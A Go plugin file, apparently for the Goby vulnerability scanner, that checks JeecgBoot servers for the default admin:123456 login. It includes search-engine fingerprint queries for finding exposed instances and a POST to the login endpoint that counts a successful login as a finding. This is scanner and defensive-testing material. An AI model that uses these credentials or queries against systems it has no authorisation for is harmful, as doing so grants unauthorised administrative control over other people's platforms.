package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JeecgBoot Default Password Vulnerability",
    "Description": "<p>JeecgBoot is a low-code development platform based on code generators.</p><p>JeecgBoot has a default password vulnerability. An attacker can control the entire platform through the default password admin:123456 and use administrator privileges to operate core functions.</p>",
    "Product": "JEECG",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-03-07",
    "Author": "sunying",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecgboot/sys/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"123456\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "登录成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot 开发平台 默认口令漏洞",
            "Product": "JEECG",
            "Description": "<p>JeecgBoot 是一个基于代码生成器的低代码开发平台。<br></p><p>JeecgBoot 存在默认口令漏洞，攻击者可通过默认口令 admin:123456 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>JeecgBoot 存在默认口令漏洞，攻击者可通过默认口令 admin:123456 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "JeecgBoot Default Password Vulnerability",
            "Product": "JEECG",
            "Description": "<p>JeecgBoot is a low-code development platform based on code generators.</p><p>JeecgBoot has a default password vulnerability. An attacker can control the entire platform through the default password admin:123456 and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-01",
    "PocId": "10765"
}`
	loginFlagdds312312 := func(hostInfo *httpclient.FixUrl) (bool, error) {
		cfg := httpclient.NewPostRequestConfig("/jeecgboot/sys/login")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Data = `{"username":"admin","password":"123456"}`
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `"success":true`) && strings.Contains(resp.RawBody, `登录成功`), err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if resp, _ := loginFlagdds312312(hostinfo); resp {
				stepLogs.VulURL = fmt.Sprintf("%s://admin:123456@%s", hostinfo.Scheme(), hostinfo.HostInfo)
				return resp
			}
			return false
		}, nil,
	))
}
